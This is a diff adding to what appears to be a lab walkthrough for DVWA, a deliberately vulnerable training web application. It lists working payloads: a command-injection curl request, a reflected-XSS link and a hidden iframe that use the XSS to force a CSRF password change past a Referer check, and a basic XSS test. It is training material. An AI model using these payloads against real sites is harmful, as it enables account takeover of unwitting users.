@@ -34,3 +34,20 @@ OR
 $ curl -s -b "PHPSESSID=${PHPSESSID};security=medium" -d 'ip=%26uname+-a&Submit=Submit' http://192.168.56.101/DVWA/vulnerabilities/exec/index.php | grep Linux    
 ```
 
+### CSRF
+
+XSS vulnerability on the DVWA site (for example this in `http://192.168.56.102/DVWA/vulnerabilities/xss_r`) needs to be used in order do defeat `Referer` check:
+
+```
+# trick victim to visit (while logged in to DVWA) the following:
+http://192.168.56.102/DVWA/vulnerabilities/xss_r/?name=%3C/pre%3E%3CScRiPt%3Enew%20Image().src=%22http://192.168.56.102/DVWA/vulnerabilities/csrf/?password_new=pass2%26password_conf=pass2%26Change=Change%22%3C%2Fscript%3E%3Cpre%3E#
+
+OR
+
+# trick victim to visit 3rd party site (while logged in to DVWA) with already planted iframe:
+<iframe SRC='http://192.168.56.102/DVWA/vulnerabilities/xss_r/?name=%3C/pre%3E%3CScRiPt%3Enew%20Image().src=%22http://192.168.56.102/DVWA/vulnerabilities/csrf/?password_new=pass3%26password_conf=pass3%26Change=Change%22%3C%2Fscript%3E%3Cpre%3E#' height="0" width="0"></iframe>
+```
+
+### XSS (Reflected)
+
+    http://192.168.56.102/DVWA/vulnerabilities/xss_r/?name=%3C/pre%3E%3CScRiPt%3Ealert(1)%3C%2Fscript%3E%3Cpre%3E#
